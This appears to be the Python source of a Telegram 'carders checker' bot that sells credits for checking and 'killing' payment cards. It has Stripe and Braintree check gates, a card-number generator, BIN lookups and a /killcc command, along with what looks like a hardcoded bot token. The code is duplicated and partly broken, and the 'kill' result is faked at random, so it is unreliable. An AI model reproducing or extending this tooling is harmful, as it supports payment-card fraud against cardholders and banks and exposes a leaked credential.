import requests
import telebot
import time
import random
from telebot import TeleBot, types
from telebot.types import Message
from gatet import Tele
from urllib.parse import urlparse
import sys
import time
import requests
import os
import string
import logging
import re
import bin   
import time
import json  # ✅ Fixes the 'json is not defined' error
import os    # ✅ Needed for file handling
from datetime import datetime
import telebot
import random
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from gen import generate_credit_card  # ✅ Correct import
import telebot
from su import handle_su_command  # Import /su handler from su.py

token = "8049348826:AAF6l88-9Pnb08JcePDtWnbwLcdCLhf1k5c" 
bot=telebot.TeleBot(token,parse_mode="HTML")
owners = ["7795055510"]


# Register /su command
@bot.message_handler(commands=['su'])
def su_handler(message):
    handle_su_command(bot, message)

@bot.message_handler(commands=["admin"])
def admin_menu(message):
    """Displays a simple text-based admin menu."""
    if str(message.from_user.id) not in owners:
        bot.reply_to(message, "❌ You are not authorized to access the admin panel.")
        return

    menu_text = """
👑 <b>Admin Panel</b>

➕ /add - Add a user  
➖ /remove - Remove a user  
🎟️ /code - Generate a redeem code  
🔓 /redeem - Redeem access code  

💳 <b>Killing Credit Bar</b>  
💰 /addcredits - Add credits  
💳 /balance - Check user balance  
🔎 /killcc - Kill a credit card (5 CR)

📊 <b>Bot Stats</b>  
📌 /stats - Show All Users  
👑 /pro - Show Premium Users  
🔥 /killuser - Show VIP Users & Credit

🧠 <b>Card Checking Gates</b>  
✅ /chk - Stripe Auth Check  
🏦 /su - Stripe Auth (SU Gate)  
💳 /b3 - Braintree Auth  
🔍 /vbv - VBV Checker (Maintenance)  

📈 <b>Info & Management</b>  
🙋 /info - Show User Info  
🗃️ /show_auth_users - Show Authorized Users  
🧾 /plans - Show USDT-based Plans  
📢 /broadcast - Send Msg to All Users  
📊 /gen - Generate Card Numbers

📚 <b>Help & Ownership</b>  
👑 /owner - Bot Owner Info  
📢 /channel - All Related Channels  
ℹ️ /help - Full Command List
"""

    bot.reply_to(message, menu_text, parse_mode="HTML")
    
    import os
import time
from datetime import datetime, timedelta

# ✅ Track bot start time
start_time = time.time()

# ✅ Function to count total users from user.txt
def count_users():
    if not os.path.exists("user.txt"):
        return 0
    with open("user.txt", "r") as file:
        return len(file.readlines())

# ✅ Function to count active premium users from id.txt
def count_premium_users():
    premium_users = 0
    current_time = time.time()

    try:
        with open("id.txt", "r") as file:
            lines = file.readlines()
            for line in lines:
                parts = line.strip().split(":")
                if len(parts) == 2:
                    expiry_time = float(parts[1])  # Get expiration timestamp
                    if expiry_time > current_time:
                        premium_users += 1  # Count only valid premium users
    except FileNotFoundError:
        return 0  # If id.txt doesn't exist, return 0
    
    return premium_users

# ✅ Command: Show bot statistics
@bot.message_handler(commands=["stats"])
def bot_stats(message):
    if str(message.from_user.id) not in owners:
        bot.reply_to(message, "❌ You are not authorized to view bot statistics.")
        return

    total_users = count_users()
    premium_users = count_premium_users()
    
    # ✅ Calculate bot uptime
    uptime_seconds = round(time.time() - start_time)
    uptime = str(timedelta(seconds=uptime_seconds))  # Convert seconds to HH:MM:SS

    # ✅ Format the response
    response = f"""
📊 <b>Bot Statistics:</b>

👥 <b>Total Users:</b> {total_users}  
👑 <b>Premium Users:</b> {premium_users}  
⏳ <b>Uptime:</b> {uptime}  
"""

    bot.reply_to(message, response, parse_mode="HTML")

# Function to get all premium users from id.txt
def get_all_premium_users():
    premium_users = []
    try:
        with open("id.txt", "r") as file:
            for line in file:
                parts = line.strip().split(":")
                if len(parts) == 2:
                    user_id, expiry_timestamp = parts
                    try:
                        expiry_timestamp = int(float(expiry_timestamp))  # Convert float to int
                        expiry_date = time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime(expiry_timestamp))
                        premium_users.append((user_id, expiry_date))
                    except ValueError:
                        print(f"Skipping invalid entry in id.txt: {line.strip()}")  # Debugging
    except FileNotFoundError:
        return []
    return premium_users


@bot.message_handler(commands=['pro'])
def check_pro_status(message):
    premium_users = get_all_premium_users()

    if premium_users:
        response = (
            "╔════════════════════════════╗\n"
            "     👑 **ROYAL VIP MEMBERS** 👑\n"
            "╚════════════════════════════╝\n\n"
        )
        for user_id, expiry_date in premium_users:
            response += (
                f"🏅 **Member ID:** `{user_id}`\n"
                f"⏳ **Expiry Date:** `{expiry_date} UTC`\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
            )
        response += "🚀 **Elite Memberships Verified!** 🚀"
    else:
        response = (
            "🚫 **No VIP members found!**\n"
            "💎 **Become an exclusive member today!** 💎"
        )

    bot.send_message(message.chat.id, response, parse_mode="Markdown")

import json
import os
from dakar import bot  # Import bot instance from dakar.py

# Function to get user credits from User_credits.json
def get_all_user_credits():
    file_path = "User_credits.json"

    if not os.path.exists(file_path):
        return None  # Return None if file is missing

    try:
        with open(file_path, "r") as file:
            return json.load(file)  # Load JSON data
    except json.JSONDecodeError:
        return None  # Handle invalid JSON

@bot.message_handler(commands=['killuser'])
def check_user_credits(message):
    user_credits = get_all_user_credits()

    if user_credits:
        response = (
            "╭━━━━━━━━━━━━━━━━━━━━━╮\n"
            "  👑 **VIP USERS CREDIT REPORT** 👑\n"
            "╰━━━━━━━━━━━━━━━━━━━━━╯\n\n"
        )
        for user_id, credits in user_credits.items():
            response += (
                f"🎩 **VIP ID:** `{user_id}`\n"
                f"💰 **Credit Balance:** `{credits} CR`\n"
                f"[🔗 View Profile](tg://user?id={user_id})\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
            )
        response += "🏆 **Elite Users & Balances Verified!** 🏆"
    else:
        response = (
            "🚫 **No VIP users found!**\n"
            "💎 **Upgrade to premium for exclusive access!** 💎"
        )

    bot.send_message(message.chat.id, response, parse_mode="Markdown")

@bot.message_handler(commands=['vbv'])
def vbv_maintenance(message):
    response = """
🚧 **VBV CHECK UNDER MAINTENANCE** 🚧

Dear user, our VBV detection system is currently **under maintenance**.  
We are working to improve accuracy and stability.

🔄 **Expected Fix Time:** Soon!  
🛠 **Status:** Upgrading API & Improving Response Speed  

Please check back later. Thanks for your patience! 💙
"""
    bot.send_message(message.chat.id, response, parse_mode="Markdown")


@bot.message_handler(commands=["owner"])
def owner_command(message):
    bot_name = "🚀 <b> Carders Checker</b>"
    bot_username = "@KalkiGamesYT"
    owner_name = "👑 <b>KalkiGamesYT  Carders</b>"
    owner_username = "@KalkiGamesYT"
    channel_link = "https://t.me/kalkigames"

    response = f"""
<code>╭───────────────────────
│ 🤖 𝙱𝙾𝚃 𝙸𝙽𝙵𝙾 
╰───────────────────────</code>

🔹 <b>Bot Name:</b> {bot_name}  
🔹 <b>Bot Username:</b> <code>{bot_username}</code>  

<code>╭───────────────────────
│ 👑 𝙾𝚆𝙽𝙴𝚁 𝙳𝙴𝚃𝙰𝙸𝙻𝚂 
╰───────────────────────</code>

👤 <b>Owner:</b> {owner_name}  
🔗 <b>Contact:</b> <a href="https://t.me/{owner_username.replace('@', '')}">{owner_username}</a>  

<code>╭───────────────────────
│ 🔹 𝙹𝙾𝙸𝙽 𝙾𝚄𝚁 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 
╰───────────────────────</code>

🔹 <a href="{channel_link}">✨ Join Our Exclusive Telegram Channel ✨</a>  
"""
    bot.reply_to(message, response, parse_mode="HTML", disable_web_page_preview=True)


BIN_API_URL = "https://lookup.binlist.net/"  # Example API

def get_flag(country_code):
    """Return flag emoji from country code."""
    if not country_code:
        return "🏳️"
    return "".join([chr(127397 + ord(c)) for c in country_code.upper()])

@bot.message_handler(commands=["bin"])
def bin_command(message):
    try:
        args = message.text.split(" ")
        if len(args) < 2:
            bot.reply_to(message, "❌ <b>Usage:</b> <code>/bin 457173</code>\n\n⚠️ Please enter a valid BIN number.", parse_mode="HTML")
            return
        
        bin_number = args[1].strip()
        
        # Fetch BIN details
        response = requests.get(f"{BIN_API_URL}{bin_number}")
        
        if response.status_code != 200:
            bot.reply_to(message, "❌ <b>Error:</b> Invalid or unknown BIN. Please try another.", parse_mode="HTML")
            return

        bin_info = response.json()
        
        country = bin_info.get("country", {})
        bank = bin_info.get("bank", {})

        country_flag = get_flag(country.get("alpha2", ""))
        
        # Get current timestamp
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())

        # Premium-styled output
        reply_text = f"""
<b>━━━━━━━━━━━ [  🔍 BIN Lookup  ] ━━━━━━━━━━━</b>

<b>💳 BIN:</b> <code>{bin_number}</code>
<b>🏦 Bank:</b> <code>{bank.get('name', 'Unknown')}</code>
<b>🌍 Country:</b> <code>{country.get('name', 'Unknown')}</code> {country_flag}
<b>💰 Currency:</b> <code>{country.get('currency', 'N/A')}</code>
<b>💳 Card Type:</b> <code>{bin_info.get('type', 'N/A')}</code>
<b>🔄 Brand:</b> <code>{bin_info.get('scheme', 'N/A')}</code>
<b>🏷️ Prepaid:</b> <code>{'Yes ✅' if bin_info.get('prepaid') else 'No ❌'}</code>

<b>━━━━━━━━━━━ [  👤 User Info  ] ━━━━━━━━━━━</b>

<b>👤 Checked by:</b> <code>{message.from_user.first_name}</code>
<b>🕒 Timestamp:</b> <code>{timestamp}</code>

<b>━━━━━━━━━━━ [  🚀 Powered By  ] ━━━━━━━━━━━</b>
<i>🔹 KalkiGamesYT Carder Checkers – Premium BIN Lookup 🔹</i>
"""
        bot.reply_to(message, reply_text, parse_mode="HTML", disable_web_page_preview=True)

    except Exception as e:
        bot.reply_to(message, f"❌ <b>Error:</b> <code>{str(e)}</code>", parse_mode="HTML")

@bot.message_handler(commands=["channel"])
def channel_info(message):
    channel_name = "✨ <b>KalkiGamesYT  Carders Official</b>"
    channel_link = "https://t.me/kalkigames"

    related_channels = [
        ("💎 <b>Channels List</b>", "https://t.me/kalkigames"),
        ("💬 <b>Our Chat Group</b>", "https://t.me/kalkigames"),
    ]

    owner_contact = "@KalkiGamesYT"

    response = f"""
<code>╭───────────────────────
│ 📢 𝙾𝙵𝙵𝙸𝙲𝙸𝙰𝙻 𝙲𝙷𝙰𝙽𝙽𝙴𝙻  
╰───────────────────────</code>

🔹 {channel_name}  
🔗 <a href='{channel_link}'>✨ Join Here ✨</a>  

<code>╭───────────────────────
│ 🔹 𝚁𝙴𝙻𝙰𝚃𝙴𝙳 𝙲𝙷𝙰𝙽𝙽𝙴𝙻𝚂  
╰───────────────────────</code>
"""
    for name, link in related_channels:
        response += f"🔹 <a href='{link}'>{name}</a>\n"

    response += f"""

<code>╭───────────────────────
│ 👤 𝙾𝚆𝙽𝙴𝚁 𝙲𝙾𝙽𝚃𝙰𝙲𝚃  
╰───────────────────────</code>

👑 <b>Contact:</b> <a href='https://t.me/{owner_contact.replace('@', '')}'>{owner_contact}</a>
"""

    bot.reply_to(message, response, parse_mode="HTML", disable_web_page_preview=True)


# ✅ Function to generate a session ID (For security)
def generate_session_id():
    return str(uuid.uuid4())

# ✅ Function to get dynamic auth token (Replace with real logic)
def get_auth_token():
    return "DYNAMIC_AUTH_TOKEN"

# ✅ VIP /kill Command - Premium Experience
@bot.message_handler(commands=["kill"])
def kill_command(message):
    help_text = """
🎩 <b>VIP CREDIT CARD KILLER SERVICE</b> 💳  

🚀 <b>Exclusive VIP Features:</b>  
✅ <b>Ultra-Fast Processing</b> 🚀  
✅ <b>Advanced AI-Based Card Checking</b> 🤖  
✅ <b>Real-Time Live Progress Bar</b> 📊  
✅ <b>Detailed Card Status Reports</b> 📝  
✅ <b>Secure Gateway Transactions</b> 🔐  
✅ <b>Premium Support 24/7</b> 🎧  

<b>🔹 How to Use:</b>  
➤ <code>/killcc CC|MM|YYYY|CVV</code>  
➤ <b>Example:</b> <code>/killcc 4111111111111111|12|2026|123</code>  

⚠️ <b>VIP Members Only:</b> This feature is <u>exclusive</u> for premium users.  
"""

    # ✅ VIP Interactive Buttons
    keyboard = InlineKeyboardMarkup()
    keyboard.add(
        InlineKeyboardButton("💳 VIP BIN Checker", callback_data="bin"),
        InlineKeyboardButton("📊 VIP Dashboard", callback_data="vip_dashboard")
    )
    keyboard.add(
        InlineKeyboardButton("🔥 Upgrade to VIP Now", url="https://t.me/KalkiGamesYT"),
        InlineKeyboardButton("📚 View Commands", callback_data="help")
    )
    keyboard.add(
        InlineKeyboardButton("👑 Contact VIP Support", url="https://t.me/KalkiGamesYT")
    )

    bot.reply_to(message, help_text, parse_mode="HTML", reply_markup=keyboard)

# ✅ VIP Inline Button Handlers
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == "bin":
        bot.answer_callback_query(call.id, "🔍 Send /bin <BIN> to check card details.")
    elif call.data == "vip_dashboard":
        vip_dashboard_text = """
🎩 <b>VIP KILL DASHBOARD</b> 💎  

🚀 <b>Your VIP Membership Includes:</b>  
🔹 <b>Priority Access</b> to All Features  
🔹 <b>Exclusive Fast Checking Mode</b>  
🔹 <b>Dedicated Premium Support</b>  

💳 <b>Available Commands:</b>  
➤ <b>/killcc</b> ➝ Use To Kill a card 💀  
➤ <b>/balance</b> ➝ Check Your Credits Balance 🔍  
➤ <b>/plans</b> ➝ View Credits Plans details 🎟  

🔥 <b>Upgrade Now for Ultimate Access!</b>  
"""
        bot.send_message(call.message.chat.id, vip_dashboard_text, parse_mode="HTML")
    elif call.data == "help":
        bot.answer_callback_query(call.id, "📚 Use /help to see all available commands.")

# ✅ Admin User IDs (Replace with actual admin Telegram IDs)
ADMINS = ["7795055510"]

# ✅ Credits Storage File
CREDITS_FILE = "user_credits.json"

# ✅ Function to Load or Fix `user_credits.json`
def load_credits():
    if not os.path.exists(CREDITS_FILE):
        with open(CREDITS_FILE, "w") as f:
            json.dump({}, f, indent=4)

    try:
        with open(CREDITS_FILE, "r") as f:
            data = f.read().strip()
            return json.loads(data) if data else {}  # ✅ Return {} if file is empty
    except (json.JSONDecodeError, ValueError):  # ✅ Reset if corrupted
        with open(CREDITS_FILE, "w") as f:
            json.dump({}, f, indent=4)
        return {}

# ✅ Function to Save Credits Securely
def save_credits(credits):
    with open(CREDITS_FILE, "w") as f:
        json.dump(credits, f, indent=4)

# ✅ Function to Get User Balance
def get_balance(user_id):
    credits = load_credits()
    return credits.get(str(user_id), 0)

# ✅ Function to Deduct Credits (Secure)
def deduct_credits(user_id, amount):
    credits = load_credits()
    user_id = str(user_id)

    if credits.get(user_id, 0) >= amount:  # ✅ Ensure user has enough credits
        credits[user_id] -= amount
        save_credits(credits)
        return True
    return False  # ✅ Return False if not enough credits

# ✅ Function to Add Credits
def add_credits(user_id, amount):
    credits = load_credits()
    user_id = str(user_id)

    credits[user_id] = credits.get(user_id, 0) + amount  # ✅ Ensure balance updates correctly
    save_credits(credits)  # ✅ Save updated balance

    notify_user(user_id, amount)  # ✅ Notify user

# ✅ Function to Notify User When Credits Are Added
def notify_user(user_id, amount):
    bot.send_message(user_id, f"""
🎉 <b>💎 VIP Credits Added!</b>  
━━━━━━━━━━━━━━  
💰 <b>+{amount} Credits</b> added to your balance.  
💳 <b>New Balance:</b> {get_balance(user_id)} Credits  
━━━━━━━━━━━━━━  
🚀 <b>Use Your Credits Now!</b>  
""", parse_mode="HTML")

# ✅ `/addcredits` Command for Admins (Add Credits to User)
@bot.message_handler(commands=["addcredits"])
def add_user_credits(message):
    if str(message.from_user.id) not in ADMINS:
        bot.reply_to(message, "🚫 <b>Access Denied!</b> You are not authorized to add credits.", parse_mode="HTML")
        return

    try:
        command_parts = message.text.split()
        if len(command_parts) != 3:
            raise ValueError("Invalid command format")

        _, user_id, amount = command_parts

        if not user_id.isdigit():
            raise ValueError("User ID must be a number")

        user_id = str(user_id)
        amount = int(amount)

        add_credits(user_id, amount)
        new_balance = get_balance(user_id)

        bot.reply_to(message, f"✅ <b>Success!</b> Added {amount} credits to user <code>{user_id}</code>. New balance: {new_balance} Credits.", parse_mode="HTML")
        bot.send_message(user_id, f"🎉 <b>Credits Added!</b>\n💰 <b>+{amount} Credits</b>\n💳 <b>New Balance:</b> {new_balance} Credits", parse_mode="HTML")

    except ValueError:
        bot.reply_to(message, "⚠️ <b>Invalid Format!</b> Use <code>/addcredits user_id amount</code>", parse_mode="HTML")
    except Exception as e:
        bot.reply_to(message, f"❌ <b>Error:</b> {str(e)}", parse_mode="HTML")

# ✅ `/balance` Command to Show User's Balance
@bot.message_handler(commands=["balance"])
def check_balance(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or message.from_user.first_name
    balance = get_balance(user_id)

    bot.reply_to(message, f"""
💰 <b>💎 VIP Balance Dashboard 💎</b>  
━━━━━━━━━━━━━━  
👤 <b>User:</b> <a href="tg://user?id={user_id}">{username}</a>  
🆔 <b>User ID:</b> <code>{user_id}</code>  
💳 <b>Current Balance:</b> {balance} Credits  
━━━━━━━━━━━━━━  
🚀 <b>Use Your Credits Now!</b>
""", parse_mode="HTML")

@bot.message_handler(commands=["killcc"])
def kill_card(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or message.from_user.first_name

    # ✅ Extract Card Details
    fullz = message.text.replace("/killcc", "").strip()
    parts = fullz.split("|")

    # ✅ Check if the format is correct before deducting credits
    if len(parts) != 4:
        bot.reply_to(message, "⚠️ <b>Invalid format!</b> Use <code>/killcc CC|MM|YYYY|CVV</code>", parse_mode="HTML")
        return

    # ✅ Only Deduct Credits After Successful Validation
    if not deduct_credits(user_id, 5):
        bot.reply_to(message, "❌ <b>Insufficient Credits!</b> You need at least 5 credits to use this feature.", parse_mode="HTML")
        return

    cc, mes, ano, cvv = parts
    start_time = time.time()

    # ✅ Fetch BIN Details (With Error Handling)
    bin_data = fetch_bin_data(cc[:6])

    # ✅ Send Processing Message
    progress_msg = bot.reply_to(message, f"""
🎩 <b>💎 VIP Card Killing In Processing 💎</b>  
━━━━━━━━━━━━━━  
👤 <b>User:</b> <a href="tg://user?id={user_id}">{username}</a>  
💳 <b>Card:</b> <code>{cc}</code>  
🏦 <b>Issuer:</b> {bin_data["bank"]}  
🌍 <b>Country:</b> {bin_data["country"]} {bin_data["flag"]}  
💰 <b>5 Credits Deducted!</b>  
💳 <b>Remaining Balance:</b> {get_balance(user_id)} Credits  
━━━━━━━━━━━━━━  
⏳ <b>Status:</b> <code>Processing... 🔄</code>  
""", parse_mode="HTML")

    # ✅ Animated Progress Bar Simulation
    progress_stages = ["🟥", "🟧", "🟨", "🟩"]
    for attempt in range(1, 33):
        time.sleep(0.3)  # Simulate small delay
        progress_bar = progress_stages[min(attempt // 8, 3)] * (attempt // 8)
        bot.edit_message_text(
            f"""
🎩 <b>💎 VIP Card Killing In Processing 💎</b>  
━━━━━━━━━━━━━━  
👤 <b>User:</b> <a href="tg://user?id={user_id}">{username}</a>  
💳 <b>Card:</b> <code>{cc}</code>  
🏦 <b>Issuer:</b> {bin_data["bank"]}  
🌍 <b>Country:</b> {bin_data["country"]} {bin_data["flag"]}  
📊 <b>Attempts:</b> {attempt}/32  
📊 <b>Progress:</b> {progress_bar}  
━━━━━━━━━━━━━━  
""",
            chat_id=message.chat.id,
            message_id=progress_msg.message_id,
            parse_mode="HTML"
        )

    # ✅ Calculate Time Taken
    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    # ✅ Simulate Random Success/Failure
    is_successful = random.choice([True, False])
    status_msg = "✅ <b>Status:</b> Card Valid & Working" if is_successful else "❌ <b>Status:</b> Card Declined"

    # ✅ Final Result with BIN Info
    final_message = f"""
🎩 <b>💎 VIP Card Killing Processing Report 💎</b>  
━━━━━━━━━━━━━━  
💳 <b>Card Details:</b>  
   🔹 <b>Card:</b> <code>{cc}</code>  
   🔹 <b>Exp:</b> {mes}/{ano}  
   🔹 <b>CVV:</b> {cvv}  

🏦 <b>Bank Details:</b>  
   🔹 <b>Issuer:</b> {bin_data["bank"]}  
   🔹 <b>Country:</b> {bin_data["country"]} {bin_data["flag"]}  
   🔹 <b>Brand:</b> {bin_data["brand"]}  
   🔹 <b>Type:</b> {bin_data["type"]} - {bin_data["level"]}  

{status_msg}

⏳ <b>Time Taken:</b> {time_taken} seconds  
━━━━━━━━━━━━━━  
💰 <b>Remaining Balance:</b> {get_balance(user_id)} Credits  
"""

    # 🔹 Add Inline Button Options
    keyboard = InlineKeyboardMarkup()
    keyboard.add(
        InlineKeyboardButton("🔥 Channel", url="https://t.me/kalkigames"),
        InlineKeyboardButton("👤 Contact Owner", url="https://t.me/KalkiGamesYT")
    )

    bot.edit_message_text(final_message, chat_id=message.chat.id, message_id=progress_msg.message_id, parse_mode="HTML", reply_markup=keyboard)

def fetch_bin_data(bin_number):
    bin_info = {
        "bank": "Unknown Bank",
        "brand": "Visa/MasterCard",
        "country": "Unknown",
        "type": "Debit",
        "level": "Classic",
        "flag": "🏳️"
    }

    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number}")
        if response.status_code == 200:
            data = response.json()
            bin_info["bank"] = data.get("bank", {}).get("name", "Unknown Bank")
            bin_info["brand"] = data.get("scheme", "Visa/MasterCard").capitalize()
            bin_info["country"] = data.get("country", {}).get("name", "Unknown")
            bin_info["type"] = data.get("type", "Debit").capitalize()
            bin_info["level"] = data.get("brand", "Classic")
            bin_info["flag"] = data.get("country", {}).get("emoji", "🏳️")
        else:
            print(f"API Error: {response.status_code}")

    except Exception as e:
        print(f"Error fetching BIN data: {e}")

    return bin_info


OWNER_LINK = "https://t.me/KalkiGamesYT"  # Change this to your Telegram link

# ✅ Function to Get Live USDT to INR Rate
def get_usdt_to_inr():
    try:
        response = requests.get("https://api.binance.com/api/v3/ticker/price?symbol=USDTINR")
        data = response.json()
        return float(data["price"])  # Returns current USDT to INR rate
    except Exception as e:
        print(f"Error fetching USDT price: {e}")
        return 85  # Default fallback value if API fails

@bot.message_handler(commands=["plans"])
def plan_command(message):
    usdt_rate = get_usdt_to_inr()  # Get the latest USDT to INR rate

    # ✅ Convert USDT to INR dynamically
    prices = {
        "10 Credits": (2, round(2 * usdt_rate)),  # 1 USDT
        "40 Credits": (4, round(4 * usdt_rate)),  # 5 USDT
        "80 Credits": (10, round(10 * usdt_rate)),  # 10 USDT
        "100 Credits": (20, round(20 * usdt_rate)),  # 20 USDT
    }

    # ✅ Generate Pricing Message
    price_message = "\n".join([f"🔹 <b>{k}</b> ➝ <code>{v[0]} USDT</code> | <code>₹{v[1]}</code>" for k, v in prices.items()])

    plan_message = f"""
🎩 <b>VIP Credit Plans</b> 💳  
━━━━━━━━━━━━━━━━━━━━━━  
📌 <b>Live USDT Rate:</b> <code>1 USDT = ₹{usdt_rate}</code>  
📌 <b>Pricing (Auto-Updated)</b>:  
{price_message}  
━━━━━━━━━━━━━━━━━━━━━━  
💡 <b>✨ Why Buy VIP Credits?</b>  
✅ <i>Access <b>Exclusive VIP Features</b></i>  
✅ <i><b>Fast</b> & <b>Secure</b> Transactions</i>  
✅ <i>24/7 <b>Premium Support</b></i>  
━━━━━━━━━━━━━━━━━━━━━━  
📢 <b>Click the button below to buy credits instantly!</b>  
"""

    keyboard = InlineKeyboardMarkup()
    keyboard.add(
        InlineKeyboardButton("💰 Buy Credits Now", url=OWNER_LINK)
    )

    bot.send_message(message.chat.id, plan_message, parse_mode="HTML", reply_markup=keyboard)


@bot.message_handler(commands=["help"])
def help_command(message):
    help_text = """
<code>╭───────────────────────────────
│ 🚀 𝐊𝐚𝐥𝐤𝐢𝐆𝐚𝐦𝐞𝐬𝐘𝐓 𝐂𝐇𝐄𝐂𝐊𝐄𝐑𝐒 - 𝐔𝐋𝐓𝐑𝐀 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 🔥
╰───────────────────────────────</code>

✨ <b>Exclusive Commands:</b>  
━━━━━━━━━━━━━━━━━━━━━━━━━━━  
🔹 <b>/owner</b> - 👑 Owner Information  
🔹 <b>/channel</b> - 📢 Official Updates & News  
🔹 <b>/bin</b> - 💳 BIN Lookup (Bank, Country, etc.)  
🔹 <b>/killcc</b> - 🔪 Killer Menu Bar
🔹 <b>/info</b> - 📜 View Your User Details  
🔹 <b>/redeem</b> - 🎟️ Activate Premium Access  
🔹 <b>/gen</b> - 🎟️📊 Generate Card Numbers

━━━━━━━━━━━━━━━━━━━━━━━━━━━  
💬 <b>Need Help?</b> Contact <a href='https://t.me/KalkiGamesYT'>@KalkiGamesYT</a>  
📢 <b>Stay Updated:</b> <a href='https://t.me/kalkigames'>Join Official Channel</a>  

━━━━━━━━━━━━━━━━━━━━━━━━━━━  
<b>🔐 Admin Commands:</b>  
👮‍♂️ If you are an admin, you can use this command for the admin menu bar:  
➡️ <b>/admin</b>  

━━━━━━━━━━━━━━━━━━━━━━━━━━━  
<code>🚀 𝐊𝐚𝐥𝐤𝐢𝐆𝐚𝐦𝐞𝐬𝐘𝐓 𝐂𝐇𝐄𝐂𝐊𝐄𝐑𝐒 - 𝐔𝐋𝐓𝐑𝐀 𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐄𝐗𝐂𝐋𝐔𝐒𝐈𝐕𝐄 🔥</code>
"""
    bot.reply_to(message, help_text, parse_mode="HTML", disable_web_page_preview=True)


owners = ["7795055510"]  # List of admin IDs
LOGS_CHANNEL_ID = -1002311066679  # Replace 

valid_redeem_codes = {}  # Stores codes with expiration times

# Function to check if a user's access is still valid
def is_user_allowed(user_id):
    current_time = time.time()
    try:
        with open("id.txt", "r") as file:
            allowed_ids = file.readlines()
            allowed_ids = [id.strip().split(":")[0] for id in allowed_ids]  # Extract user IDs
            if str(user_id) in allowed_ids:
                return True
    except FileNotFoundError:
        print("id.txt file not found. Please create it.")
    return False

# Function to add a user with an expiration time
def add_user(user_id, expire_time):
    with open("id.txt", "a") as file:
        file.write(f"{user_id}:{expire_time}\n")  # Store user ID with expiration time
    
    # Send confirmation message to user
    bot.send_message(user_id, f"✅ Successfully Redeemed!\nYour access is valid until <b>{time.ctime(expire_time)}</b>.", parse_mode="HTML")

    # Log to Telegram Channel
    bot.send_message(LOGS_CHANNEL_ID, f"✅ <b>New User Access</b>\n"
                                      f"👤 User ID: <code>{user_id}</code>\n"
                                      f"🕒 Expires on: {time.ctime(expire_time)}",
                     parse_mode="HTML")

# Function to remove expired users and log to channel
def remove_expired_users():
    current_time = time.time()
    try:
        with open("id.txt", "r") as file:
            allowed_ids = file.readlines()
        with open("id.txt", "w") as file:
            for line in allowed_ids:
                user, expire = line.strip().split(":")
                if float(expire) < current_time:
                    bot.send_message(LOGS_CHANNEL_ID, f"❌ <b>User Access Expired</b>\n"
                                                      f"👤 User ID: <code>{user}</code>\n"
                                                      f"🕒 Expired on: {time.ctime(float(expire))}",
                                     parse_mode="HTML")
                    # Send message to user
                    bot.send_message(user, "❌ Your access has expired. Please contact support if you need more time.")
                    continue  # Remove expired users
                file.write(line + "\n")
    except FileNotFoundError:
        print("id.txt file not found.")

# Function to generate a unique redeem code
def generate_redeem_code():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))

# Admin creates a redeem code with a time limit
@bot.message_handler(commands=["code"])
def generate_code(message):
    if str(message.from_user.id) not in owners:
        bot.reply_to(message, "❌ You are not authorized to create codes.")
        return

    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        bot.reply_to(message, "⚠️ Usage: `/code <days>`\nExample: `/code 3` for 3 days", parse_mode="Markdown")
        return

    days = int(args[1])
    expire_time = time.time() + (days * 86400)  # Convert days to seconds
    code = generate_redeem_code()

    valid_redeem_codes[code] = expire_time  # Store code with expiration time

    bot.reply_to(message, f"✅ Redeem Code Created:\n`{code}` (Valid for {days} days)", parse_mode="Markdown")

# User redeems a code
@bot.message_handler(commands=["redeem"])
def redeem_code(message):
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ Usage: `/redeem <code>`\nExample: `/redeem ABC123XYZ`", parse_mode="Markdown")
        return

    code = args[1]
    current_time = time.time()

    if code not in valid_redeem_codes:
        bot.reply_to(message, "❌ Invalid Redeem Code.")
        return

    if valid_redeem_codes[code] < current_time:
        del valid_redeem_codes[code]  # Remove expired code
        bot.reply_to(message, "❌ This code has expired.")
        return

    # Grant access and store the expiration time
    add_user(message.from_user.id, valid_redeem_codes[code])
    del valid_redeem_codes[code]  # Remove code after use

# User redeems a code
@bot.message_handler(commands=["redeem"])
def redeem_code(message):
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ Usage: `/redeem <code>`\nExample: `/redeem ABC123XYZ`", parse_mode="Markdown")
        return

    code = args[1]
    current_time = time.time()

    if code not in valid_redeem_codes:
        bot.reply_to(message, "❌ Invalid Redeem Code.")
        return

    if valid_redeem_codes[code] < current_time:
        del valid_redeem_codes[code]  # Remove expired code
        bot.reply_to(message, "❌ This code has expired.")
        return

    # Grant access and store the expiration time
    add_user(message.from_user.id, valid_redeem_codes[code])
    del valid_redeem_codes[code]  # Remove code after use

    bot.reply_to(message, f"✅ Successfully Redeemed!\nYour access is valid until <b>{time.ctime(valid_redeem_codes[code])}</b>.", parse_mode="HTML")

# Admin creates a redeem code with a time limit
@bot.message_handler(commands=["code"])
def generate_code(message):
    if str(message.from_user.id) not in owners:
        bot.reply_to(message, "❌ You are not authorized to create codes.")
        return

    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        bot.reply_to(message, "⚠️ Usage: `/code <days>`\nExample: `/code 3` for 3 days", parse_mode="Markdown")
        return

    days = int(args[1])
    expire_time = time.time() + (days * 86400)  # Convert days to seconds
    code = generate_redeem_code()

    valid_redeem_codes[code] = expire_time  # Store code with expiration time

    bot.reply_to(message, f"✅ Redeem Code Created:\n`{code}` (Valid for {days} days)", parse_mode="Markdown")

# User redeems a code
@bot.message_handler(commands=["redeem"])
def redeem_code(message):
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ Usage: `/redeem <code>`\nExample: `/redeem ABC123XYZ`", parse_mode="Markdown")
        return

    code = args[1]
    current_time = time.time()

    if code not in valid_redeem_codes:
        bot.reply_to(message, "❌ Invalid Redeem Code.")
        return

